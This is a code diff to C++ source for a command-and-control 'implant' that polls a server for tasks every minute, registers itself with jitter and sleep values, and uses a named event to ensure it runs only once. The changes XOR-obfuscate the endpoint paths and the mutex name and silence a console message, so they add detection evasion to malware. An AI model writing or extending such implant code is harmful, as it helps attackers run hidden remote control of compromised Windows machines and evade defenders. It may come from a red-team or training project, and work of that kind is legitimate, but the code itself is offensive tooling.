@@ -6,7 +6,7 @@ void IWillRunForever(void){
     while(true){
 
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
-		std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
+		std::string new_item = HttpGetCommand(xor_string(":rpaJvzxxt{qf",0x15), IMPLANT_ID);
         json converted_new_item = json::parse(new_item);
         int num_of_tasks = converted_new_item.size();
 
@@ -36,12 +36,12 @@ void registerimplant(void){
 	/* This has yet to be Tested - Currently receives a 500 error */
     std::string jitter = std::to_string(5);
     std::string sleep = std::to_string(60000);
-    HttpRegisterImplant("/register_implant", jitter, sleep);
+    HttpRegisterImplant(xor_string(":gpr|fapgJ|xeyt{a",0x15), jitter, sleep);
     return;
 }
 
 BOOL CheckInstance(){
-    HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE, "GABBAGOOL" );
+    HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE,xor_string("RTWWTRZZY",0x15));
     if(m_hStartEvent == NULL) {
         CloseHandle( m_hStartEvent ); 
         return false;
@@ -67,7 +67,7 @@ int main(int argc, char* argv[]){
     
     /* Receive Tasks, Execute Tasks, Send Back Tasks */
     if (!CheckInstance()){
-        printf("ALREADY RUN\n");
+        //printf("ALREADY RUN\n");
         return -1;
     }
     
